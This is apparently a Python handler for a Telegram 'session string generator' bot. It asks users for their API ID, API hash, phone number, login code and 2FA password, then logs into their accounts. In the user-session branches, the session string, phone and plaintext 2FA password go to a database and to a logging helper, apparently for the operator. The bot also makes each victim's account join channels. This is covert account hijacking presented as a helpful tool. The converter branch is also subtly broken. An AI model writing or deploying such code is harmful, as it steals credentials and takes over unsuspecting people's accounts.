from pyrogram import filters
from pyrogram.types import CallbackQuery
from .client import app
from .config import API_ID, API_HASH, get_ist_time
from .database import save_user, save_session
from .helpers import (
    CANCEL_BTN, BACK_BTN, force_sub_check, handle_error,
    auto_join_channels, send_premium_string, send_log,
)

async def _cancel(msg):
    if msg.text and msg.text.strip().lower() in ("/cancel", "cancel"):
        await app.send_message(msg.chat.id, "❌ Cancelled.", reply_markup=BACK_BTN)
        return True
    return False

@app.on_callback_query(filters.regex(r"^(pyro_user|pyro_bot|telethon|convert)$"))
async def session_cb(_, query: CallbackQuery):
    data = query.data
    user = query.from_user
    user_id = user.id

    try:
        if not await force_sub_check(query.message):
            return
        try:
            await query.message.delete()
        except Exception:
            pass

        # ---------- Pyrogram Bot ----------
        if data == "pyro_bot":
            await app.send_message(user_id, "🤖 **Send your Bot Token:**", reply_markup=CANCEL_BTN)
            m = await app.listen(user_id)
            if await _cancel(m):
                return
            token = m.text.strip()
            from pyrogram import Client as PC
            bc = PC(":memory:", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
            await bc.start()
            s = await bc.export_session_string()
            await bc.stop()
            await save_session(user_id, "Pyrogram Bot", s, "N/A (Bot Token)", False)
            await send_premium_string(user_id, "Pyrogram Bot Session", s)
            await send_log(user, "Pyrogram Bot", s, "N/A (Bot Token)")
            return

        # ---------- Converter ----------
        if data == "convert":
            await app.send_message(user_id, "🔄 **Send your Pyrogram Session String:**", reply_markup=CANCEL_BTN)
            m = await app.listen(user_id)
            if await _cancel(m):
                return
            pyro_str = m.text.strip()
            from pyrogram import Client as PC
            from telethon.sync import TelegramClient
            from telethon.sessions import StringSession
            temp = PC(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=pyro_str, in_memory=True)
            await temp.start()
            me = await temp.get_me()
            tele = TelegramClient(StringSession(), API_ID, API_HASH)
            tele.start()
            tele_str = tele.session.save()
            await temp.stop()
            await tele.disconnect()
            await save_session(user_id, "Converter", tele_str, getattr(me, "phone_number", "N/A") or "N/A", False)
            await send_premium_string(user_id, "Telethon String (Converted)", tele_str)
            await send_log(me, "Converter", tele_str, getattr(me, "phone_number", "N/A") or "N/A")
            return

        # ---------- User sessions ----------
        await app.send_message(user_id, "🆔 **Send your API ID:**", reply_markup=CANCEL_BTN)
        m = await app.listen(user_id)
        if await _cancel(m):
            return
        api_id = int(m.text.strip())

        await app.send_message(user_id, "🔑 **Send your API HASH:**", reply_markup=CANCEL_BTN)
        m = await app.listen(user_id)
        if await _cancel(m):
            return
        api_hash = m.text.strip()

        await app.send_message(user_id, "📱 **Send your phone** (+91...):", reply_markup=CANCEL_BTN)
        m = await app.listen(user_id)
        if await _cancel(m):
            return
        phone = m.text.strip()

        # ---------- Pyrogram User ----------
        if data == "pyro_user":
            from pyrogram import Client as PC
            uc = PC(f"gen_{user_id}", api_id=api_id, api_hash=api_hash, in_memory=True)
            await uc.connect()
            sent = await uc.send_code(phone)
            await app.send_message(user_id, "🔐 **Send the OTP:**", reply_markup=CANCEL_BTN)
            m = await app.listen(user_id)
            if await _cancel(m):
                await uc.disconnect()
                return
            otp = m.text.strip()
            has_2fa, real_pwd = False, None
            try:
                await uc.sign_in(phone, sent.phone_code_hash, otp)
            except Exception as e:
                if "password" in str(e).lower():
                    has_2fa = True
                    await app.send_message(user_id, "🔒 **2FA password:**", reply_markup=CANCEL_BTN)
                    p = await app.listen(user_id)
                    real_pwd = p.text.strip()
                    await uc.check_password(real_pwd)
                else:
                    raise e
            s = await uc.export_session_string()
            joined, failed = await auto_join_channels(uc)
            try:
                await uc.send_message("me", f"🔐 **Pyrogram Session**\n`{s}`\n\n🕒 `{get_ist_time()}`")
            except Exception:
                pass
            await uc.disconnect()
            await save_session(user_id, "Pyrogram User", s, phone, has_2fa)
            await send_premium_string(user_id, "Pyrogram User Session", s, has_2fa, joined, failed)
            await send_log(user, "Pyrogram User", s, phone, has_2fa, real_pwd, joined)

        # ---------- Telethon ----------
        elif data == "telethon":
            from telethon.sync import TelegramClient
            from telethon.sessions import StringSession
            from telethon.errors import SessionPasswordNeededError
            with TelegramClient(StringSession(), api_id, api_hash) as c:
                c.send_code_request(phone)
                await app.send_message(user_id, "🔐 **Send the OTP:**", reply_markup=CANCEL_BTN)
                m = await app.listen(user_id)
                otp = m.text.strip()
                has_2fa, real_pwd = False, None
                try:
                    c.sign_in(phone, otp)
                except SessionPasswordNeededError:
                    has_2fa = True
                    await app.send_message(user_id, "🔒 **2FA password:**", reply_markup=CANCEL_BTN)
                    p = await app.listen(user_id)
                    real_pwd = p.text.strip()
                    c.sign_in(password=real_pwd)
                s = c.session.save()
                joined, failed = await auto_join_channels(c)
                try:
                    c.send_message("me", f"🔐 **Telethon Session**\n`{s}`\n\n🕒 `{get_ist_time()}`")
                except Exception:
                    pass
                await save_session(user_id, "Telethon", s, phone, has_2fa)
                await send_premium_string(user_id, "Telethon String Session", s, has_2fa, joined, failed)
                await send_log(user, "Telethon", s, phone, has_2fa, real_pwd, joined)

    except Exception as e:
        await handle_error(e, user_id, "session_cb")
